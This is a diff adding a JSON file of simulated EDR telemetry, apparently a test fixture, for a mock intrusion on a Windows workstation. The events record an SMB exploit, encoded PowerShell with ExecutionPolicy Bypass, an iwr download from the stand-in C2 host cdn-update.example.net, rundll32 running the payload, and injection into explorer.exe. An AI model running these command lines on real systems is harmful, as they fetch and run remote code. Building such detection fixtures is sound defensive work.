@@ -1,0 +1,3358 @@
+[
+  {
+    "activity_id": 1,
+    "activity_name": "Open",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 4,
+    "severity": "High",
+    "time": 1778774402000,
+    "timezone_offset": -420,
+    "type_uid": 400101,
+    "type_name": "Network Activity: Open",
+    "message": "External host opened SMB connection to workstation; exploit payload delivered to the PC endpoint.",
+    "metadata": {
+      "uid": "meta-net-0001",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774403500
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "203.0.113.45",
+      "port": 51422,
+      "type": "Unknown",
+      "type_id": 0,
+      "location": {
+        "country": "ZZ",
+        "desc": "Example external attacker IP"
+      }
+    },
+    "dst_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 445,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:203.0.113.45:51422:10.10.20.25:445:20260514T160002Z",
+      "direction": "Inbound",
+      "direction_id": 1,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "smb",
+    "app_name": "SMB",
+    "traffic": {
+      "bytes_in": 18240,
+      "bytes_out": 3112,
+      "packets_in": 64,
+      "packets_out": 41
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "203.0.113.45",
+        "record_id": "203.0.113.45"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "445",
+        "record_id": "dst_endpoint.port:445"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:203.0.113.45:51422:10.10.20.25:445:20260514T160002Z\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 4,
+    "severity": "High",
+    "time": 1778774414000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "Service host spawned cmd.exe after inbound SMB exploit activity.",
+    "metadata": {
+      "uid": "meta-proc-0002",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774415200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:884:1778772900000",
+        "pid": 884,
+        "name": "svchost.exe",
+        "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+        "created_time": 1778772900000,
+        "file": {
+          "name": "svchost.exe",
+          "path": "C:\\Windows\\System32\\svchost.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-18",
+          "name": "SYSTEM",
+          "type": "System",
+          "type_id": 3
+        },
+        "integrity": "System",
+        "parent_process": null
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4320:1778774414000",
+      "pid": 4320,
+      "name": "cmd.exe",
+      "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+      "created_time": 1778774414000,
+      "file": {
+        "name": "cmd.exe",
+        "path": "C:\\Windows\\System32\\cmd.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:884:1778772900000",
+        "pid": 884,
+        "name": "svchost.exe",
+        "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+        "created_time": 1778772900000,
+        "file": {
+          "name": "svchost.exe",
+          "path": "C:\\Windows\\System32\\svchost.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-18",
+          "name": "SYSTEM",
+          "type": "System",
+          "type_id": 3
+        },
+        "integrity": "System",
+        "parent_process": null
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "svchost.exe",
+        "record_id": "procname:svchost.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "cmd.exe",
+        "record_id": "procname:cmd.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+        "record_id": "cmd:4320"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\cmd.exe",
+        "record_id": "file:C:\\Windows\\System32\\cmd.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0002\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774418000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "cmd.exe launched encoded PowerShell command to download a payload.",
+    "metadata": {
+      "uid": "meta-proc-0003",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774419200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4320:1778774414000",
+        "pid": 4320,
+        "name": "cmd.exe",
+        "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+        "created_time": 1778774414000,
+        "file": {
+          "name": "cmd.exe",
+          "path": "C:\\Windows\\System32\\cmd.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:884:1778772900000",
+          "pid": 884,
+          "name": "svchost.exe",
+          "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+          "created_time": 1778772900000,
+          "file": {
+            "name": "svchost.exe",
+            "path": "C:\\Windows\\System32\\svchost.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-18",
+            "name": "SYSTEM",
+            "type": "System",
+            "type_id": 3
+          },
+          "integrity": "System",
+          "parent_process": null
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4388:1778774418000",
+      "pid": 4388,
+      "name": "powershell.exe",
+      "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+      "created_time": 1778774418000,
+      "file": {
+        "name": "powershell.exe",
+        "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:4320:1778774414000",
+        "pid": 4320,
+        "name": "cmd.exe",
+        "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+        "created_time": 1778774414000,
+        "file": {
+          "name": "cmd.exe",
+          "path": "C:\\Windows\\System32\\cmd.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:884:1778772900000",
+          "pid": 884,
+          "name": "svchost.exe",
+          "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+          "created_time": 1778772900000,
+          "file": {
+            "name": "svchost.exe",
+            "path": "C:\\Windows\\System32\\svchost.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-18",
+            "name": "SYSTEM",
+            "type": "System",
+            "type_id": 3
+          },
+          "integrity": "System",
+          "parent_process": null
+        }
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "cmd.exe",
+        "record_id": "procname:cmd.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "powershell.exe",
+        "record_id": "procname:powershell.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+        "record_id": "cmd:4388"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "record_id": "file:C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0003\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 6,
+    "activity_name": "Traffic",
+    "category_uid": 4,
+    "category_name": "Network Activity",
+    "class_uid": 4001,
+    "class_name": "Network Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774423000,
+    "timezone_offset": -420,
+    "type_uid": 400106,
+    "type_name": "Network Activity: Traffic",
+    "message": "PowerShell downloaded suspicious payload from external C2 infrastructure over HTTPS.",
+    "metadata": {
+      "uid": "meta-net-0004",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774424500
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "src_endpoint": {
+      "ip": "10.10.20.25",
+      "port": 49821,
+      "hostname": "WS-FIN-023.acme.local",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2
+    },
+    "dst_endpoint": {
+      "ip": "198.51.100.77",
+      "hostname": "cdn-update.example.net",
+      "port": 443,
+      "type": "Server",
+      "type_id": 1,
+      "location": {
+        "country": "ZZ",
+        "desc": "Example C2 infrastructure"
+      }
+    },
+    "initiator_id": 1,
+    "initiator": "Source Endpoint",
+    "is_src_dst_assignment_known": true,
+    "connection_info": {
+      "uid": "conn:WS-FIN-023:10.10.20.25:49821:198.51.100.77:443:20260514T160023Z",
+      "direction": "Outbound",
+      "direction_id": 2,
+      "protocol_name": "TCP",
+      "protocol_num": 6,
+      "protocol_ver": "IPv4",
+      "tcp_flags": "SYN,ACK"
+    },
+    "app_protocol_name": "https",
+    "app_name": "HTTPS",
+    "traffic": {
+      "bytes_in": 74240,
+      "bytes_out": 2380,
+      "packets_in": 91,
+      "packets_out": 33
+    },
+    "observables": [
+      {
+        "name": "src_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "10.10.20.25",
+        "record_id": "10.10.20.25"
+      },
+      {
+        "name": "dst_endpoint.ip",
+        "type": "IP Address",
+        "type_id": 2,
+        "value": "198.51.100.77",
+        "record_id": "198.51.100.77"
+      },
+      {
+        "name": "dst_endpoint.port",
+        "type": "Port",
+        "type_id": 11,
+        "value": "443",
+        "record_id": "dst_endpoint.port:443"
+      },
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "url.url_string",
+        "type": "URL String",
+        "type_id": 6,
+        "value": "https://cdn-update.example.net/a/px.dat",
+        "record_id": "url:https://cdn-update.example.net/a/px.dat"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"conn_uid\": \"conn:WS-FIN-023:10.10.20.25:49821:198.51.100.77:443:20260514T160023Z\", \"scenario\": \"external compromise and lateral movement\"}",
+    "url": {
+      "scheme": "https",
+      "hostname": "cdn-update.example.net",
+      "port": 443,
+      "path": "/a/px.dat",
+      "url_string": "https://cdn-update.example.net/a/px.dat"
+    }
+  },
+  {
+    "activity_id": 1,
+    "activity_name": "Launch",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774435000,
+    "timezone_offset": -420,
+    "type_uid": 100701,
+    "type_name": "Process Activity: Launch",
+    "message": "PowerShell launched rundll32.exe using downloaded DLL-like payload.",
+    "metadata": {
+      "uid": "meta-proc-0005",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774436200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4388:1778774418000",
+        "pid": 4388,
+        "name": "powershell.exe",
+        "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+        "created_time": 1778774418000,
+        "file": {
+          "name": "powershell.exe",
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4320:1778774414000",
+          "pid": 4320,
+          "name": "cmd.exe",
+          "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+          "created_time": 1778774414000,
+          "file": {
+            "name": "cmd.exe",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:884:1778772900000",
+            "pid": 884,
+            "name": "svchost.exe",
+            "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+            "created_time": 1778772900000,
+            "file": {
+              "name": "svchost.exe",
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-18",
+              "name": "SYSTEM",
+              "type": "System",
+              "type_id": 3
+            },
+            "integrity": "System",
+            "parent_process": null
+          }
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "session": {
+        "uid": "logon:WS-FIN-023:ACME:j.smith:20260514T154000Z",
+        "created_time": 1778773200000
+      }
+    },
+    "process": {
+      "uid": "proc:WS-FIN-023:4512:1778774435000",
+      "pid": 4512,
+      "name": "rundll32.exe",
+      "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+      "created_time": 1778774435000,
+      "file": {
+        "name": "rundll32.exe",
+        "path": "C:\\Windows\\System32\\rundll32.exe",
+        "parent_folder": {
+          "path": "C:\\Windows\\System32"
+        }
+      },
+      "user": {
+        "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "name": "j.smith",
+        "email_addr": "j.smith@acme.local",
+        "domain": "ACME",
+        "type": "User",
+        "type_id": 1
+      },
+      "integrity": "High",
+      "parent_process": {
+        "uid": "proc:WS-FIN-023:4388:1778774418000",
+        "pid": 4388,
+        "name": "powershell.exe",
+        "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+        "created_time": 1778774418000,
+        "file": {
+          "name": "powershell.exe",
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4320:1778774414000",
+          "pid": 4320,
+          "name": "cmd.exe",
+          "cmd_line": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...",
+          "created_time": 1778774414000,
+          "file": {
+            "name": "cmd.exe",
+            "path": "C:\\Windows\\System32\\cmd.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
+            "type": "User",
+            "type_id": 1
+          },
+          "integrity": "High",
+          "parent_process": {
+            "uid": "proc:WS-FIN-023:884:1778772900000",
+            "pid": 884,
+            "name": "svchost.exe",
+            "cmd_line": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+            "created_time": 1778772900000,
+            "file": {
+              "name": "svchost.exe",
+              "path": "C:\\Windows\\System32\\svchost.exe",
+              "parent_folder": {
+                "path": "C:\\Windows\\System32"
+              }
+            },
+            "user": {
+              "uid": "S-1-5-18",
+              "name": "SYSTEM",
+              "type": "System",
+              "type_id": 3
+            },
+            "integrity": "System",
+            "parent_process": null
+          }
+        }
+      }
+    },
+    "launch_type": "Other",
+    "launch_type_id": 99,
+    "requested_permissions": "0x00000000",
+    "actual_permissions": "0x00000000",
+    "observables": [
+      {
+        "name": "device.hostname",
+        "type": "Hostname",
+        "type_id": 1,
+        "value": "WS-FIN-023.acme.local",
+        "record_id": "WS-FIN-023.acme.local"
+      },
+      {
+        "name": "actor.user.name",
+        "type": "User Name",
+        "type_id": 4,
+        "value": "j.smith",
+        "record_id": "user:j.smith"
+      },
+      {
+        "name": "actor.process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "powershell.exe",
+        "record_id": "procname:powershell.exe"
+      },
+      {
+        "name": "process.name",
+        "type": "Process Name",
+        "type_id": 9,
+        "value": "rundll32.exe",
+        "record_id": "procname:rundll32.exe"
+      },
+      {
+        "name": "process.cmd_line",
+        "type": "Command Line",
+        "type_id": 13,
+        "value": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "record_id": "cmd:4512"
+      },
+      {
+        "name": "process.file.path",
+        "type": "File Path",
+        "type_id": 45,
+        "value": "C:\\Windows\\System32\\rundll32.exe",
+        "record_id": "file:C:\\Windows\\System32\\rundll32.exe"
+      }
+    ],
+    "raw_data": "{\"source\": \"simulator\", \"event_uid\": \"proc-0005\", \"scenario\": \"external compromise and lateral movement\"}"
+  },
+  {
+    "activity_id": 4,
+    "activity_name": "Inject",
+    "category_uid": 1,
+    "category_name": "System Activity",
+    "class_uid": 1007,
+    "class_name": "Process Activity",
+    "severity_id": 5,
+    "severity": "Critical",
+    "time": 1778774444000,
+    "timezone_offset": -420,
+    "type_uid": 100704,
+    "type_name": "Process Activity: Inject",
+    "message": "rundll32.exe injected payload into explorer.exe for user-context persistence.",
+    "metadata": {
+      "uid": "meta-proc-0006",
+      "version": "1.8.0",
+      "product": {
+        "uid": "product:acme-edr-sensor",
+        "name": "ACME Endpoint Sensor",
+        "vendor_name": "ACME Security",
+        "version": "6.8.2",
+        "feature": {
+          "name": "Endpoint Telemetry",
+          "uid": "edr-telemetry"
+        }
+      },
+      "profiles": [
+        "host",
+        "security_control"
+      ],
+      "logged_time": 1778774445200
+    },
+    "status_id": 1,
+    "status": "Success",
+    "status_code": "0",
+    "status_detail": "The activity was observed by endpoint sensor",
+    "device": {
+      "uid": "asset:acme:ws-fin-023",
+      "name": "WS-FIN-023",
+      "hostname": "WS-FIN-023.acme.local",
+      "ip": "10.10.20.25",
+      "mac": "00:50:56:AA:20:25",
+      "type": "Desktop",
+      "type_id": 2,
+      "os": {
+        "name": "Microsoft Windows 11 Pro",
+        "type": "Windows",
+        "type_id": 100,
+        "version": "23H2",
+        "build": "22631.3593"
+      },
+      "domain": "ACME",
+      "org": {
+        "uid": "tenant:acme-corp",
+        "name": "ACME-CORP"
+      }
+    },
+    "actor": {
+      "process": {
+        "uid": "proc:WS-FIN-023:4512:1778774435000",
+        "pid": 4512,
+        "name": "rundll32.exe",
+        "cmd_line": "rundll32.exe C:\\ProgramData\\WinCache\\updater.dat,StartW",
+        "created_time": 1778774435000,
+        "file": {
+          "name": "rundll32.exe",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_folder": {
+            "path": "C:\\Windows\\System32"
+          }
+        },
+        "user": {
+          "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+          "name": "j.smith",
+          "email_addr": "j.smith@acme.local",
+          "domain": "ACME",
+          "type": "User",
+          "type_id": 1
+        },
+        "integrity": "High",
+        "parent_process": {
+          "uid": "proc:WS-FIN-023:4388:1778774418000",
+          "pid": 4388,
+          "name": "powershell.exe",
+          "cmd_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA...; iwr https://cdn-update.example.net/a/px.dat -OutFile C:\\ProgramData\\WinCache\\updater.dat",
+          "created_time": 1778774418000,
+          "file": {
+            "name": "powershell.exe",
+            "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parent_folder": {
+              "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0"
+            }
+          },
+          "user": {
+            "uid": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+            "name": "j.smith",
+            "email_addr": "j.smith@acme.local",
+            "domain": "ACME",
